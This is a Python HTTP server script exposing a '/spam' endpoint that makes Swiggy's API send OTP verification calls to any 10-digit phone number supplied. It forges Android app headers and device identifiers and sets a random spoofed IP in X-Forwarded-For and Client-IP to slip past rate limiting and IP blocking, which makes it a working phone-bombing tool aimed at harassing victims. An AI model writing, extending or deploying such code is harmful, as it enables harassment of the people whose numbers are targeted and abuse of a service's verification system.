from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import random
import json
import uuid
import time
from urllib.parse import parse_qs, urlparse
from datetime import datetime

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse URL path
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        # Set response headers
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Check if path is /spam
        if path != '/spam':
            response = {
                "success": False,
                "error": "Invalid endpoint. Use /spam endpoint",
                "example": "https://your-domain.vercel.app/spam?number=9876543210"
            }
            self.wfile.write(json.dumps(response, indent=2).encode())
            return
        
        # Parse query parameters
        query = parse_qs(parsed_path.query)
        number = query.get('number', [None])[0]
        
        # Validate phone number
        if not number or not number.isdigit() or len(number) != 10:
            response = {
                "success": False,
                "error": "Invalid phone number. Please provide 10 digits.",
                "example": "https://your-domain.vercel.app/spam?number=9876543210"
            }
            self.wfile.write(json.dumps(response, indent=2).encode())
            return
        
        # Send Swiggy OTP (single request only)
        result = self.send_swiggy_otp(number)
        
        # Write response
        self.wfile.write(json.dumps(result, indent=2).encode())
        return
    
    def generate_random_ip(self):
        """Generate random IP for each request"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def generate_headers(self, ip_address):
        """Generate Swiggy headers"""
        trace_id = f"00-{uuid.uuid4().hex[:16]}{uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:12]}-00"
        tid = str(uuid.uuid4())
        sid = f"{uuid.uuid4().hex[:8]}-f9d8-4cb8-9e01-{uuid.uuid4().hex[:12]}"
        swuid = "4c27ae3a76b146f3"
        deviceid = "4c27ae3a76b146f3"
        
        headers = {
            "Host": "profile.swiggy.com",
            "TraceState": f"@nr=0-2-737486-14933469-25139d3d045e42ba----{int(time.time() * 1000)}",
            "TraceParent": trace_id,
            "NewRelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
            "PL-Version": "55",
            "User-Agent": "Swiggy-Android",
            "TID": tid,
            "SID": sid,
            "Version-Code": "1161",
            "App-Version": "4.38.1",
            "Latitude": "0.0",
            "Longitude": "0.0",
            "OS-Version": "13",
            "Accessibility_Enabled": "false",
            "SWUID": swuid,
            "DeviceID": deviceid,
            "X-Network-Quality": "GOOD",
            "Accept-Encoding": "gzip",
            "Accept": "application/json; charset=utf-8",
            "X-NewRelic-ID": "UwUAVV5VGwIEXVJRAwcO",
            "X-Forwarded-For": ip_address,
            "Client-IP": ip_address,
            "Content-Type": "application/json; charset=utf-8"
        }
        return headers
    
    def send_swiggy_otp(self, phone_number):
        """Send single OTP request to Swiggy"""
        api_url = "https://profile.swiggy.com/api/v3/app/request_call_verification"
        random_ip = self.generate_random_ip()
        headers = self.generate_headers(random_ip)
        
        payload = {"mobile": phone_number}
        
        result = {
            "success": False,
            "service": "Swiggy",
            "phone": phone_number,
            "timestamp": datetime.now().isoformat(),
            "endpoint": "/spam",
            "ip_used": random_ip
        }
        
        try:
            response = requests.post(
                api_url,
                json=payload,
                headers=headers,
                timeout=15
            )
            
            result["status_code"] = response.status_code
            
            # Parse response based on status code
            if response.status_code == 200:
                try:
                    data = response.json()
                    result["success"] = True
                    result["status"] = "SUCCESS"
                    result["message"] = "OTP sent successfully"
                    
                    # Add response data if available
                    if isinstance(data, dict):
                        if data.get("statusCode") == 200:
                            result["details"] = "OTP requested successfully"
                        elif data.get("message"):
                            result["message"] = data["message"]
                except:
                    result["status"] = "SUCCESS"
                    result["message"] = "OTP request accepted"
                    
            elif response.status_code == 429:
                result["status"] = "RATE_LIMITED"
                result["message"] = "Too many requests. Please try later."
                
            elif response.status_code == 403:
                result["status"] = "BLOCKED"
                result["message"] = "IP blocked by service"
                
            elif response.status_code == 400:
                result["status"] = "BAD_REQUEST"
                result["message"] = "Invalid request format"
                
            else:
                result["status"] = f"HTTP_{response.status_code}"
                result["message"] = f"Service returned status {response.status_code}"
                
            # Try to get response text
            try:
                result["response_preview"] = response.text[:200]
            except:
                pass
                
        except requests.exceptions.Timeout:
            result["status"] = "TIMEOUT"
            result["message"] = "Request timed out"
            
        except requests.exceptions.ConnectionError:
            result["status"] = "CONNECTION_ERROR"
            result["message"] = "Failed to connect to service"
            
        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = str(e)[:100]
        
        return result

# For local testing
def run(server_class=HTTPServer, handler_class=handler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'🚀 Swiggy OTP API Server running on http://127.0.0.1:{port}/')
    print(f'📱 Use endpoint: http://127.0.0.1:{port}/spam?number=9876543210')
    print('⚠️  Single request only - No automatic retry')
    print('Press Ctrl+C to stop')
    httpd.serve_forever()

if __name__ == '__main__':
    run()